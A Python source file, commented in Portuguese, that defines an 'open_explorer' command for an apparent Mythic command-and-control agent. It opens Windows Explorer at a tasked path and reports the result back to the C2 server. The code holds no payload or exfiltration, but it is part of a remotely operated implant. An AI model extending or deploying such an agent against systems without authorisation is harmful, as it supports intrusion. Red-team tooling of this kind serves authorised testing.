import os
import json
from datetime import datetime

def open_explorer(self, task_id, data=None):
    """
    Abre o Explorador de Arquivos (Windows Explorer) em um diretório especificado ou no diretório atual do agente.
    
    Args:
        task_id (str): ID da tarefa enviada pelo Mythic.
        data (dict, optional): Dados da tarefa no formato JSON (ex.: {'host': '...', 'path': '...', 'file': '...', 'full_path': '...'}).
    
    Returns:
        str: JSON com o resultado da operação.
    """
    # Processa os parâmetros da tarefa
    path = None
    if data and isinstance(data, dict):
        if 'full_path' in data and data['full_path']:
            path = data['full_path']
        elif 'path' in data and data['path']:
            path = data['path']
        # Ignora 'file' e 'host' pois não são relevantes para abrir o Explorer

    try:
        if path:
            # Normaliza o caminho para garantir que seja válido
            full_path = os.path.abspath(path) if os.path.exists(path) else os.path.abspath(os.path.join(self.current_directory, path))
            if os.path.exists(full_path):
                os.startfile(full_path)
                output = f"Opened Explorer at {full_path}"
                success = True
            else:
                output = f"Path {full_path} does not exist"
                success = False
        else:
            # Abre o Explorer no diretório atual
            os.startfile(self.current_directory)
            output = f"Opened Explorer at {self.current_directory}"
            success = True

        # Prepara a resposta no formato esperado pelo Mythic
        response = {
            "action": "post_response",
            "responses": [
                {
                    "task_id": task_id,
                    "user_output": output,
                    "success": success
                }
            ]
        }

        # Envia a atualização da tarefa para o Mythic
        self.sendTaskOutputUpdate(task_id, output)
        return json.dumps(response)

    except Exception as e:
        error_msg = f"Failed to open Explorer: {str(e)}"
        response = {
            "action": "post_response",
            "responses": [
                {
                    "task_id": task_id,
                    "user_output": error_msg,
                    "success": False
                }
            ]
        }
        self.sendTaskOutputUpdate(task_id, error_msg)
        return json.dumps(response)
